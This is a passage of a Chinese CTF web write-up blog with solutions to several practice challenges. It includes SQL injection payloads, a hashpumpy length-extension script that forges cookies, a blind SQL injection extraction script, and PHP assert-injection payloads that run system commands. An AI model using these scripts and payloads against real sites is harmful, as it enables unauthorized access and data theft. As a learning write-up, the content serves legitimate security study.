class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </div><div class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </div><div class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</div><div class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="built_in">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close(<span class="variable">$con</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>分析源码：</p>
<ul>
<li>第一大块是判断两个变量uname,pwd是否为空。</li>
<li>第二大块是进行了sql过滤。</li>
<li>第三大块查询了数据库，flag被两个if包括着，第一个if限定查询结果只有一行，第二个if要求pwd相等</li>
</ul>
<p>由于sql过滤严格，sql注入尝试无果。<br>考虑从pwd相等入手，利用 <strong>or</strong>,<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external"><strong>limit offset</strong></a>,  <strong>#</strong> 先过滤第一个if<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or &apos;1&apos;=&apos;1&apos; limit 1 offset 0 #</div></pre></td></tr></table></figure></p>
<p>第二个if 用到 <a href="http://www.w3school.com.cn/sql/sql_groupby.asp" target="_blank" rel="external"><strong>group by</strong></a> 和 <a href="http://www.68idc.cn/help/mysqldata/mysql/20150607358491.html" target="_blank" rel="external">with rollup</a> （rollup–&gt;汇总,使group by的列的值为null,汇总其他列的数值）<br>利用这两个函数，构造 null = null<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or &apos;1&apos;=&apos;1&apos; group by pwd with rollup limit 1 offset 0#</div></pre></td></tr></table></figure></p>
<p>offset 0 到 n 尝试得到我们汇总 pwd = null 的那一行<br>同时使 pwd = null （不是填写null，空着就好）</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrebupellj30ic01ma9y.jpg" alt="4"><br></div>


<h2 id="9-18-有点意思吧"><a href="#9-18-有点意思吧" class="headerlink" title="[9.18]有点意思吧"></a>[9.18]有点意思吧</h2><p><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：php源码，hash长度扩展攻击"><a href="#涉及范围：php源码，hash长度扩展攻击" class="headerlink" title="涉及范围：php源码，hash长度扩展攻击"></a>涉及范围：php源码，hash长度扩展攻击</h3><p>抓包，source这个参数有点奇怪，尝试改为1，得到源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</div><div class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</div><div class="line"></div><div class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</div><div class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</div><div class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</div><div class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</div><div class="line"></div><div class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</div><div class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</div><div class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>分析源码：</p>
<ul>
<li>第一个if：要求cookie里的<strong>getmein</strong>不为空</li>
<li>第二个if：<strong>username</strong> 等于 admin ； <strong>password</strong> 不等于 ‘admin’</li>
<li>第三个if：getmein 等于 未知15位secret+username+password 的MD5</li>
</ul>
<p>因为MD5，url解码，一开始以为是php语言漏洞，诸多尝试无果。<br>仔细收集已有信息，分析问题如下<br>有 <strong>未知15位secret+’admin’+’admin’</strong> 的hash<br>求 <strong>未知15位secret+’admin’+password</strong> 的hash<br>查阅资料，新的知识盲区，密码学知识： <a href="//www.freebuf.com/articles/web/31756.html">hash长度扩展攻击</a><br>之后的题解就参考别人的吧：</p>
<ul>
<li><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="external">c语言MD5的题解</a>:最后一步计算MD5前512位随便是因为在C代码中ABCD改的不是初始值，而是512为整数的分组执行完毕之后的ABCD。</li>
<li><a href="http://blog.csdn.net/u010726042/article/details/70738279" target="_blank" rel="external">python的题解hashpumpy和hashpump</a></li>
</ul>
<p>然后是给自己以后看,方便回忆的粗糙原理手绘图QAQ<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrf3ssur3j31hc0u0n6d.jpg" alt="hash长度攻击,png"></p>
<ul>
<li>512位的分组后面第一位写1,再补零，后64位写原来的长度，使之生成的MD5与secretadminadmin的完全一致</li>
<li>本地生成MD5时，512位的分组随便填写，最后一次变换的ABCD值用secretadminadmin的MD5值转变来（高地位互换），之所以要512位的分组是让最后填充的长度数值相同</li>
</ul>
<h2 id="有点意思吧2"><a href="#有点意思吧2" class="headerlink" title="有点意思吧2"></a>有点意思吧2</h2><p><a href="http://web.jarvisoj.com:32778/" target="_blank" rel="external">戳这里=w=</a><br>此题前提：[9.18]有点意思吧</p>
<h3 id="涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本"><a href="#涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本" class="headerlink" title="涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本"></a>涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本</h3><div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fjsm8frpyfj30no03xq2q.jpg" alt="1"><br></div>

<p>web日常1：先看源码，没啥东西。<br>web日常2：跑目录——用字典替换url后缀，访问，查看是否成功。可用burpsuite+字典 或 <a href="https://github.com/Err0rzz/SourceLeakHacker" target="_blank" rel="external">工具</a></p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjsm8ujz3kj30m108iwj3.jpg" alt="2"><br></div>

<p>(多线程 HTTPConnectionPool问题 暂未解决)<br>看到<strong>index.php~</strong>,访问，下载过来一个文件<br>文件日常：拉到kali下用file，binwalk 判断文件类型和有没有隐藏 （后缀是~,和开头是 . 的文件在桌面不直接显示，需要<strong>ls</strong>查看）</p>
<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjsm91ak2kj30fs06jgnq.jpg" alt="3"><br></div>

<p><strong>vim的swp格式</strong>：vim编写的文件可能会有错误遗留文件：data.php –&gt; .data.php.swp (若修改文件再次错误 后缀变为.swo .swn 尾字母向前推移)</p>
<p>index.php~加上.swp后缀。用<strong>vim -r index.php~.swp</strong> 恢复读写模式可以打开，得到页面源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Web 350&lt;/title&gt;</div><div class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</div><div class="line">        body &#123;</div><div class="line">                background:gray;</div><div class="line">                text-align:center;</div><div class="line">        &#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">        &lt;?php</div><div class="line">                <span class="variable">$auth</span> = <span class="literal">false</span>;</div><div class="line">                <span class="variable">$role</span> = <span class="string">"guest"</span>;</div><div class="line">                <span class="variable">$salt</span> =</div><div class="line">                <span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>])) &#123;</div><div class="line">                        <span class="variable">$role</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]);</div><div class="line">                        <span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</div><div class="line">                        <span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))) &#123;</div><div class="line">                                <span class="variable">$auth</span> = <span class="literal">true</span>;</div><div class="line">                        &#125; <span class="keyword">else</span> &#123;</div><div class="line">                                <span class="variable">$auth</span> = <span class="literal">false</span>;</div><div class="line">                        &#125;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        <span class="variable">$s</span> = serialize(<span class="variable">$role</span>);</div><div class="line">                        setcookie(<span class="string">'role'</span>,<span class="variable">$s</span>);</div><div class="line">                        <span class="variable">$hsh</span> = md5(<span class="variable">$salt</span>.strrev(<span class="variable">$s</span>));</div><div class="line">                        setcookie(<span class="string">'hsh'</span>,<span class="variable">$hsh</span>);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</div><div class="line">                        <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is“</span></div><div class="line"><span class="string">                &#125; else &#123;</span></div><div class="line"><span class="string">                        echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></div><div class="line"><span class="string">                &#125;</span></div><div class="line"><span class="string">        ?&gt;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;</span></div></pre></td></tr></table></figure></p>
<p><a href="https://phperzh.com/articles/1814" target="_blank" rel="external">serialize与unserialize函数</a>      <a href="http://www.w3school.com.cn/php/func_string_strrev.asp" target="_blank" rel="external">strrev函数</a><br>结合抓包，分析源码：</p>
<ul>
<li>要求 role不为空 ，此处必然满足，不考虑</li>
<li>要求 role反序列化后 === ‘admin’</li>
<li>要求 MD5（salt.role的反转字符串） === hsh</li>
<li>已知 MD5($salt.”<strong>;”tseug”:5:s</strong>“) = 3a4727d57463f122833d9e732f94e4e0<br>解决第一个反序列化后相等，利用<a href="https://phperzh.com/articles/1814" target="_blank" rel="external">php在线</a>测试序列化与反序列化的特性及漏洞：</li>
</ul>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjsm98tiabj30ug072q30.jpg" alt="4"><br></div>

<p><strong>序列化</strong>：根据数据结构变成特定的字符串，s为str，i为int，{ }为数组等等。<br><strong>反序列化</strong>：根据开头判断数据结构类型，只会读取该结构内的字符，后面的字符不做处理。</p>
<p>根据以上特性，使role开头 = <strong>s:5”admin”;</strong> 就可满足条件。</p>
<hr>
<p>解决第二个HASH相等，根据hash长度攻击的要求：</p>
<ul>
<li>因为反转，role的末尾需要 = <strong>s:5”guest”;</strong></li>
<li>salt的长度未知，考虑利用python脚本暴力破解</li>
</ul>
<p>python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding=utf8</span></div><div class="line"><span class="comment">#   md5($salt." ;"tseug":5:s ") = 3a4727d57463f122833d9e732f94e4e0 </span></div><div class="line"><span class="comment">#   md5($salt." ;"tseug":5:s xxxxx ;"nimda":5:s ") = xxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> hashpumpy</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">hexdigest = <span class="string">"3a4727d57463f122833d9e732f94e4e0"</span>;</div><div class="line">original_data = <span class="string">";\"tseug\":5:s"</span>;</div><div class="line">data_to_add = <span class="string">";\"nimda\":5:s"</span>;</div><div class="line">url=<span class="string">"http://web.jarvisoj.com:32778"</span>;</div><div class="line"></div><div class="line"><span class="comment">#设置key_length的范围</span></div><div class="line"><span class="keyword">for</span> key_length <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">15</span>):</div><div class="line">	result = hashpumpy.hashpump(hexdigest,original_data,data_to_add,key_length);</div><div class="line"></div><div class="line">	role_re = result[<span class="number">1</span>][::<span class="number">-1</span>];  	 <span class="comment">#16进制\x80 代表一个字符 可以直接对换</span></div><div class="line">	role = urllib.quote(role_re); 	 <span class="comment">#16进制直接url编码得到 %xx</span></div><div class="line">	hsh = result[<span class="number">0</span>];</div><div class="line">	cookies = &#123;<span class="string">'role'</span>:role,<span class="string">'hsh'</span>:hsh&#125;;</div><div class="line">	</div><div class="line">	response = requests.get(url,cookies=cookies);</div><div class="line">	<span class="keyword">if</span> response.headers[<span class="string">'Content-Length'</span>] != <span class="string">'210'</span> :</div><div class="line">		<span class="keyword">print</span> key_length</div><div class="line">		<span class="keyword">print</span> response.text</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">print</span> key_length</div></pre></td></tr></table></figure>
<p>运行结果如下：</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fjsm9frsbqj30lx0e977w.jpg" alt="5"><br></div>


<h2 id="9-1-看起来有点难啊"><a href="#9-1-看起来有点难啊" class="headerlink" title="[9.1]看起来有点难啊"></a>[9.1]看起来有点难啊</h2><p><a href="http://ctf5.shiyanbar.com/basic/inject/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：sql盲注"><a href="#涉及范围：sql盲注" class="headerlink" title="涉及范围：sql盲注"></a>涉及范围：sql盲注</h3><p>哎，做完之后感想，还是才学疏浅没有脑洞的J，第一步就卡死了。<br>进行以下sql注入尝试，尝试得到两种返回状况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">admin= 1’ and <span class="string">'1'</span>=<span class="string">'1'</span> --+ <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= 1’ or <span class="string">'1'</span>=<span class="string">'1'</span> --+  <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= admin‘ and <span class="string">'1'</span>=<span class="string">'1'</span> --+ <span class="built_in">pwd</span>=1</div><div class="line"></div><div class="line">admin= admin<span class="string">' and '</span>1<span class="string">'='</span>2<span class="string">' --+ pwd=1</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">admin= admin’</span></div></pre></td></tr></table></figure></p>
<p>总结出题目的三种返回状态：</p>
<ul>
<li><strong>数据库链接失败！</strong>：从数据库返回0行</li>
<li><strong>登录失败，错误的用户名和密码</strong>：从数据库有返回</li>
<li><strong>空白</strong>: sql语句错误</li>
</ul>
<p>有小朋友可能要提出，为啥要试admin呀，我一开始就是没有想到试admin，也没有用 or 找到三种返回的规律，两脸蒙蔽。<br>但是只要想到 <code>1’ or ‘1’=’1‘ and 巴拉巴拉 --+</code> 一样可以得到两种返回状态，只不过再需要盲注一下username得出admin<br>于是就是<strong>布尔型盲注</strong></p>
<p>然后就盲注套路走起来:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null"</span>  <span class="comment">#替换column  得到 username password</span></div><div class="line"></div><div class="line"><span class="comment">#判断表</span></div><div class="line">sql_table=<span class="string">"admin' and table.column is not null"</span>  <span class="comment">#替换table 得到 admin</span></div><div class="line"></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin' and ascii(substring(password,%s,1))-%s -- "</span></div><div class="line">或</div><div class="line">sql=“admin<span class="string">' and substring(password,1,1)= '</span>i<span class="string">' -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> ascii(substring(password,<span class="number">1</span>,<span class="number">1</span>)) = <span class="string">'123'</span> -- ”</div><div class="line">sql=“admin<span class="string">' and password like '</span>i%<span class="string">' -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> password = <span class="string">'flag'</span> -- ”</div><div class="line">sql=“admin<span class="string">' and ascii(substring(password,%s,1))-10 -- ”</span></div><div class="line"><span class="string">sql=“admin'</span> <span class="keyword">and</span> case when(substr(password,%s,<span class="number">1</span>)=<span class="string">'i'</span>) then sleep(<span class="number">10</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) -- ”</div><div class="line">sql=“admin<span class="string">' and if(substr(password,%s,1)='</span>i<span class="string">') ,sleep(10) , sleep(0) -- ”</span></div></pre></td></tr></table></figure></p>
<p>  另外在此题中不能使用select，简单尝试过滤无效，就不用类似<code>&quot;admin&#39; and (select password from table)&gt;0&quot;</code>注入。</p>
<p>  最后贴上跑username和password的代码，注意</p>
<ul>
<li>访问太频繁会被禁止访问，考虑sleep或改参数几位几位跑</li>
<li>页面编码不同无法直接显示匹配字符，右键返回页面查看源码发现是GB2312,解码匹配</li>
<li>chr() : ascii–&gt;字符</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url=<span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php"</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin' and ascii(substring(password,%s,1))-%s -- "</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'admin'</span>:sql %(i,x),<span class="string">'pass'</span>:<span class="string">'admin'</span>,<span class="string">'action'</span>:<span class="string">'login'</span>&#125;</div><div class="line">	response=requests.get(url,params=data)</div><div class="line">	<span class="comment">#print response.content.decode('GB2312')</span></div><div class="line">	<span class="keyword">if</span> response.content.decode(<span class="string">'GB2312'</span>).find(<span class="string">'数据库'</span>)&gt;<span class="number">0</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">print</span> i</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">150</span>):</div><div class="line">		print(x),</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += chr(x)</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
<p>脚本出username,password直接提交得到FLAG。</p>
<p>哎….常规套路的题目做了半天………QAQ</p>
<h2 id="皇家邮电平台"><a href="#皇家邮电平台" class="headerlink" title="皇家邮电平台"></a>皇家邮电平台</h2><p><a href="http://cms.nuptzj.cn/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：源码泄露，本地文件包含，sql注入，后门利用"><a href="#涉及范围：源码泄露，本地文件包含，sql注入，后门利用" class="headerlink" title="涉及范围：源码泄露，本地文件包含，sql注入，后门利用"></a>涉及范围：源码泄露，本地文件包含，sql注入，后门利用</h3><p>这题题目步骤以及源码较多，自己写需要花大力气，查到两篇不错的writeup，互补贴用了。<br><a href="http://blog.spoock.com/2016/06/20/nuptzj-web2-writeup/" target="_blank" rel="external">题解1</a><br><a href="http://blog.csdn.net/ni9htmar3/article/details/53791997" target="_blank" rel="external">题解2</a>（ctrl+f 皇家）<br>大致记录一下解题的点：</p>
<ul>
<li>观察各个页面的源代码，发现<code>file=sm.txt</code>,修改参数得到各个页面的源码</li>
<li>分析源码，得到更多页面，发现后台登录页面；</li>
<li>分析源码，sql只过滤一遍,过滤不严格，sql注入点在so.php</li>
<li>根据提示爆破账号密码</li>
<li>后台登录界面登录，得到回调木马</li>
<li>利用木马遍历目录，得到flag</li>
</ul>
<p>这题环环相扣，漏掉一点都无法继续，也有很多多余的杂乱信息。<br>从分析页面到getshell，可以说是比较现实的WEB渗透了。<br>对后门我也是只懂皮毛….贴上找到的知识贴——<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="external">关于各种后门</a><br>放上自己的注入代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">爆破账号密码：</div><div class="line">soid=chacharr(49)/**/anandd/**/(seselectlect/**/ascii(substring(userpaspasss,1,1))/**/ffromrom/**/aadmindmin)&lt;&gt;1</div></pre></td></tr></table></figure></p>
<p><strong>Q&amp;A</strong></p>
<p>遍历后的出现目录的页面 乱码 ：下载页面，到sublime中换编译方式打开即可</p>
<hr>
<p>还有好长的路呢…..慢慢学习嗯</p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="git信息泄露-hackgit-php字符串拼接注入"><a href="#git信息泄露-hackgit-php字符串拼接注入" class="headerlink" title=".git信息泄露 hackgit php字符串拼接注入"></a>.git信息泄露 hackgit php字符串拼接注入</h3><p>全程知识盲区…<br>about页面得知用到git<br><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/" target="_blank" rel="external">git</a>的配置不当有可能导致.git信息泄露,漏洞表现：</p>
<ul>
<li>可以查看  .git  .git/objects</li>
<li>可以下载  .git/index<br>利用<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">githack</a>尝试下载源码，有一些php,找到目标<strong>flag.php</strong></li>
</ul>
<p>index.php其中关键源码：<br>‘’’php<br>&lt;?php<br>if (isset($_GET[‘page’])) {<br>    $page = $_GET[‘page’];<br>} else {<br>    $page = “home”;<br>}<br>$file = “templates/“ . $page . “.php”;<br>assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);<br>assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);<br>?&gt;<br>‘’’</p>
<p>咋一看并没有什么软用，但是</p>
<ul>
<li>可以控制$page的值</li>
<li>php神奇的特性，字符串链接命令，命令可以执行<br><a href="http://ww1.sinaimg.cn/large/006iKNp3gy1fkfmrveqtej30l002dt8j.jpg" target="_blank" rel="external">字符串链接</a></li>
<li>与sql注入原理相同的php拼接写入代码</li>
</ul>
<p>payload(为了清楚，变量不写””):<br>‘’’php<br>$page = ‘.system(“ls ./templates”).’   ;<br>$file(合并后) = templates/‘.system(“ls ./templates”).’..php   ;<br>assert(“strpos(‘templates/.’ . system(“ls ./templates”) .  ‘..php’ , ‘..’ ) === false”)<br>‘’’<br>由于assert函数，会把””中的语句当做php代码执行，所以可以在其中用<strong>//</strong>注释””后面乱七八糟的语句，自己构筑代码<br>所以给出另一个payload<br>‘’’php<br>$page = ‘, ‘..’) === false and system(‘cat ./templates/flag.php’);    //   ;<br>$file(合并后) = templates/‘, ‘..’) === false and system(‘cat ./templates/flag.php’);    //.php   ;<br>assert(  “strpos(‘templates/‘ , ‘..’) === false  and  system(‘cat ./templates/flag.php’);    //.php’, ‘..’ ) === false”  );<br>‘’’<br>两种payload都可以在<code>system(&quot; &quot;)</code>中可以执行任意linux命令<br>flag.php返回需要查看源码才能看到…….嗯..绝望卡了两年</p>
<h2 id="俄罗斯方块"><a href="#俄罗斯方块" class="headerlink" title="俄罗斯方块"></a>俄罗斯方块</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="js代码-jsFuck"><a href="#js代码-jsFuck" class="headerlink" title="js代码 jsFuck"></a>js代码 jsFuck</h3><p>一开始推断是到分数有服务器返回什么，抓包尝试修改无效。<br>源码找到<strong>tetris.js</strong><br><a href="http://tool.oschina.net/codeformat/js/" target="_blank" rel="external">js代码格式化</a>后阅读代码，找到关键代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.mayAdd = function(a) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.scores.length &lt; <span class="keyword">this</span>.maxscores) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</div><div class="line">            !<span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (var b = <span class="keyword">this</span>.scores.length - <span class="number">1</span>; <span class="number">0</span> &lt;= b; --b) <span class="keyword">if</span> (<span class="keyword">this</span>.scores[b].score &lt; a) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span 